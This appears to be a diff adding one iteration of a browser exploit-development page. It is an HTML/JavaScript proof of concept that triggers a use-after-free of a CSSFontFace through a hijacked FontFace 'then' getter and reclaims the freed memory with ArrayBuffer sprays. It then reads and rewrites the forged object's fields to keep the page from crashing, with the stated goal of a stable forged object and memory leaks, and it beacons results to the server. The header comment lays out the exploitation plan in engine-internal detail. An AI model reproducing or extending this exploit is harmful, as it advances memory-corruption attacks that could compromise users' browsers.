@@ -1,0 +1,276 @@
+<!--
+  p670: null-table bisect — p669-clamp EXACT base (benign seed float @+0x44,
+  keepspray via __sprayAlive, OBS cross-round telemetry, opCount clamp kept
+  harmless, batch-only beacons, DUMP1/DUMP2, ROUNDS=8, all fields) with ONE
+  new delta: NULL-TABLE WRITE.
+
+  EVIDENCE (p669, beacons_eff19147, 2026-11-11 21:20-21:23): 9 clean loads,
+  ALL: R0 hit=1 (T=0x10001ca9a0 5th first-gen anchor, rc=1, seed 100.001)
+  -> OBS opc=0 rc=1 st=0 Tsame=y at r0 AND r1 -> R1 MISS gf=1 -> R1LATE
+  alive -> death in R2 window. Clamp NEVER fired (opc stayed 0 everywhere).
+  VERDICT (c'): amortizedCleanup hypothesis DEAD — no WeakHashSet iteration
+  ever touches the forged object (opc never moves). The R2 killer only READS
+  the forged object; our only writes ever seen on it: +0x58 T, +0x68 W,
+  +0x00 rc=1 — all at R0 reclaim-setup.
+
+  R2-KILLER = RANK D: ~CSSFontFace on the forged object at round-2 teardown.
+  Destruction order (CSSFontFace.h:183-205 members, reverse destruction):
+    m_timeoutTimer first (TimerBase dtor Timer.cpp:262-272: stop() +
+    m_heapItem->clearTimer() — timer inert here, benign)
+    -> m_wrapper WeakPtr (benign) -> m_clients WeakHashSet:
+    ~HashTable (HashTable.h:420-428): `if (m_table) deallocateTable(m_table)`
+    -> deallocateTable (HashTable.h:1163-1170): size = T[-1] (tableSizeOffset
+    -1, :585), walk buckets calling ~Ref<WeakPtrImpl>, then
+    HashTableMalloc::free(T - 16) (metadataSize 16, :589).
+    T is the FREED face's clients-table pointer the engine wrote at +0x58.
+    => EITHER double-free of the (possibly still-live) 80B zeroedMalloc
+       block (HashTable.h:1147-1156) OR walk of freed-garbage buckets
+       reading T[-1] metadata => LETHAL BOTH WAYS. Null-ref dtors elsewhere
+       are safe (~Ref Ref.h:54-62, ~RefPtr RefPtr.h:75, ~Vector Vector.h:
+       749-755) — ~HashTable is the ONLY unconditional killer.
+  WHO destroys: the wrapper ff_r holds Ref<CSSFontFace> m_backing
+  (FontFace.cpp:165-171) — alive via __facesAlive; the FORGED face is the
+  CSS-connected one whose owner chain died with round-0's removed style;
+  the round-2 style update drops the last engine-side reference =>
+  ~CSSFontFace runs on the forged buffer.
+
+  INTERVENTION: after OBS (read) in BOTH analyzeEarly AND analyzeLate
+  (destructor may run at teardown before the LATE pass), write +0x58 and
+  +0x5C (m_table full pointer) = 0 on EVERY tracked hit lane (R0 + later).
+  If m_table is null when ~HashTable runs, :423 `if (m_table)` skips
+  deallocateTable entirely => destructor becomes fully benign => page
+  survives R2+.
+  Emit 'NULLT r<N> Twas=<hex>' when a real table pointer is nulled.
+  Risk noted: nulling m_table also breaks scanHit for FUTURE rounds' lanes
+  (hit detect reads +0x58) — NULLT runs only on already-tracked lanes after
+  their analysis, and the R0 lane's T was already recorded in OBS; current
+  round scan happens BEFORE its lane joins hitLanes. Miss-rounds after
+  nulling are expected artifacts, not engine signal.
+
+  Decision tree:
+    (a) ALIVE end-r8 ......... ~HashTable WAS the killer => STABLE FORGE
+        ACHIEVED; multi-round leak era begins (groom telemetry next).
+    (b) death moves R3+ ...... partial: nulling helped but another teardown
+        deref remains (variant dtor on nonzero discriminant? engine
+        re-stamps +0x58 after our null? count rounds gained).
+    (c) death still R2 ....... destructor hypothesis dead OR the engine
+        re-stamps T between our NULLT and the dtor — check OBS Tsame flips;
+        next: R2 substep beacons (p665 pattern) + valid +0x08 forge via W.
+
+  Beacon: P670-.  CRASH_CLASS: MEDIUM.
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p670</title></head>
+<body>p670: null-table bisect (size-seed, r8)
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+}
+function flush() {
+  while (bQ.length) {
+    var b = bQ.splice(0, 2).join('|');
+    try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P670-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+  }
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'nulltable r8');
+flush();
+
+var ROUNDS = 8;
+var round = 0;
+var results = [];
+var gfired = -1;
+
+var sty = null, ff = null;
+var armed = false;
+var spray = [];
+window.__sprayAlive = [];
+var snap1 = null;
+
+var round0Lane = null;
+var round0T = '';
+var hitLanes = [];
+
+function seedLane(dv, i) {
+  dv.setFloat32(0x44, 100 + round + i * 0.001, true);
+}
+
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (!armed) return undefined;
+    armed = false;
+    gfired = round;
+    try { sty.remove(); } catch(e) {}
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    spray = window.__sprayAlive[round] = [];
+    for (var i = 0; i < 24; i++) {
+      var ab = new ArrayBuffer(192);
+      var dv = new DataView(ab);
+      seedLane(dv, i);
+      spray.push(dv);
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+function dumpLane(dv) {
+  var out = [];
+  for (var off = 0; off <= 0xB8; off += 8) {
+    var lo = dv.getUint32(off, true), hi = dv.getUint32(off + 4, true);
+    if (lo !== 0 || hi !== 0) out.push(off.toString(16) + ':' + hex32(hi) + hex32(lo));
+  }
+  return out.join(',');
+}
+
+function scanHit() {
+  for (var i = 0; i < spray.length; i++) {
+    if (spray[i].getUint32(0x58, true) !== 0 || spray[i].getUint32(0x5C, true) !== 0) return i;
+  }
+  return -1;
+}
+
+function obsR0Lane() {
+  if (!round0Lane) return;
+  try {
+    var tNow = hex32(round0Lane.getUint32(0x5C, true)) + hex32(round0Lane.getUint32(0x58, true));
+    emit('OBS r' + round, 'opc=' + round0Lane.getUint32(0x60, true) +
+         ' rc=' + round0Lane.getUint32(0x00, true) +
+         ' st=' + round0Lane.getUint8(0x82) +
+         ' Tsame=' + (tNow === round0T ? 'y' : 'n'));
+  } catch(e) { emit('OBS r' + round, 'ERR ' + String(e).slice(0,60)); }
+}
+
+/* NULL-TABLE: zero +0x58/+0x5C (m_table) on every tracked hit lane */
+function nullTables() {
+  for (var k = 0; k < hitLanes.length; k++) {
+    try {
+      var lo = hitLanes[k].dv.getUint32(0x58, true);
+      var hi = hitLanes[k].dv.getUint32(0x5C, true);
+      if (lo !== 0 || hi !== 0) {
+        emit('NULLT r' + round, 'lane=' + hitLanes[k].tag +
+             ' Twas=' + hex32(hi) + hex32(lo));
+        hitLanes[k].dv.setUint32(0x58, 0, true);
+        hitLanes[k].dv.setUint32(0x5C, 0, true);
+      }
+    } catch(e) { emit('NULLT r' + round, 'ERR lane=' + hitLanes[k].tag); }
+  }
+}
+
+/* opCount clamp kept from p669 (harmless, keeps parity with p669 evidence) */
+function clampLanes() {
+  for (var k = 0; k < hitLanes.length; k++) {
+    try {
+      var v = hitLanes[k].dv.getUint32(0x60, true);
+      if (v !== 0) {
+        hitLanes[k].dv.setUint32(0x60, 0, true);
+        emit('CLAMP r' + round, 'lane=' + hitLanes[k].tag + ' opc-was=' + v);
+      }
+    } catch(e) {}
+  }
+}
+
+function trackHit(hit) {
+  var dv = spray[hit];
+  if (round === 0) round0Lane = dv;
+  hitLanes.push({ tag: 'r' + round, dv: dv });
+}
+
+function beginRound() {
+  sty = document.createElement('style');
+  sty.textContent = "@font-face { font-family: s" + round + "; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(sty);
+  ff = new FontFace('f' + round, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(ff);
+  void ff.loaded;
+  window.__facesAlive = window.__facesAlive || [];
+  window.__facesAlive.push(ff);
+  armed = true;
+  document.fonts.load('1em f' + round + ', s' + round, 'AB');
+  setTimeout(analyzeEarly, 150);
+  setTimeout(analyzeLate, 3500);
+}
+
+function analyzeEarly() {
+  try {
+    obsR0Lane();                      /* read first ... */
+    nullTables();                     /* ... then null m_table (dtor may fire at teardown before LATE) */
+    var hit = scanHit();
+    if (hit < 0) {
+      emit('R' + round, 'MISS gf=' + gfired);
+      results.push({ r: round, lane: -1, t: '-', w: '-' });
+    } else {
+      var dv = spray[hit];
+      snap1 = dumpLane(dv);
+      var tLo = dv.getUint32(0x58, true), tHi = dv.getUint32(0x5C, true);
+      var wLo = dv.getUint32(0x68, true), wHi = dv.getUint32(0x6C, true);
+      var dirtyNear = 0;
+      for (var j = Math.max(0, hit - 3); j <= Math.min(spray.length - 1, hit + 3); j++) {
+        if (spray[j].getUint32(0x58, true) !== 0 || spray[j].getUint32(0x5C, true) !== 0) dirtyNear++;
+      }
+      results.push({ r: round, lane: hit, t: hex32(tHi) + hex32(tLo), w: hex32(wHi) + hex32(wLo) });
+      if (round === 0) round0T = hex32(tHi) + hex32(tLo);
+      trackHit(hit);
+      emit('R' + round, 'hit=' + hit + ' T=' + hex32(tHi) + hex32(tLo) +
+           ' W=' + hex32(wHi) + hex32(wLo) + ' rc=' + dv.getUint32(0x00, true) +
+           ' opc=' + dv.getUint32(0x60, true) + ' st82=' + dv.getUint8(0x82) +
+           ' gf=' + gfired + ' dirtyNear=' + dirtyNear +
+           ' seed=' + dv.getFloat32(0x44, true).toFixed(3));
+      emit('R' + round + 'DUMP1', snap1.slice(0, 700));
+    }
+    flush();
+  } catch(e) { emit('R' + round + '-FATAL', String(e).slice(0,150)); flush(); }
+}
+
+function analyzeLate() {
+  try {
+    obsR0Lane();                      /* read first ... */
+    var hit = scanHit();
+    if (hit >= 0 && spray.length) {
+      var dv = spray[hit];
+      var snap2s = dumpLane(dv);
+      emit('R' + round + 'LATE', 'alive st82=' + dv.getUint8(0x82) +
+           ' rc=' + dv.getUint32(0x00, true) +
+           ' changed=' + (snap1 !== snap2s ? 'YES' : 'no'));
+      if (snap1 !== snap2s) emit('R' + round + 'DUMP2', snap2s.slice(0, 700));
+    } else {
+      emit('R' + round + 'LATE', 'alive (miss-round)');
+    }
+    nullTables();                     /* ... then null again (idempotent; catches re-stamps) */
+    clampLanes();                     /* opCount clamp kept (harmless) */
+    flush();
+    round++;
+    if (round < ROUNDS) {
+      gfired = -1;
+      setTimeout(beginRound, 250);
+    } else {
+      var ts = {}, lanes = [];
+      for (var k = 0; k < results.length; k++) {
+        ts[results[k].t] = (ts[results[k].t] || 0) + 1;
+        lanes.push(results[k].lane);
+      }
+      var keys = Object.keys(ts);
+      emit('SUMMARY', 'nulltable rounds=' + results.length + ' kept=' + window.__sprayAlive.length +
+           ' distinctT=' + keys.length + ' lanes=[' + lanes.join(',') + ']');
+      for (var q = 0; q < keys.length; q++) emit('TVAL', keys[q] + ' x' + ts[keys[q]]);
+      emit('ALIVE', 'end-r8-nulltable');
+      flush();
+    }
+  } catch(e) { emit('R' + round + 'LATE-FATAL', String(e).slice(0,150)); flush(); }
+}
+
+setTimeout(beginRound, 50);
+
+})();
+</script>
+</body></html>
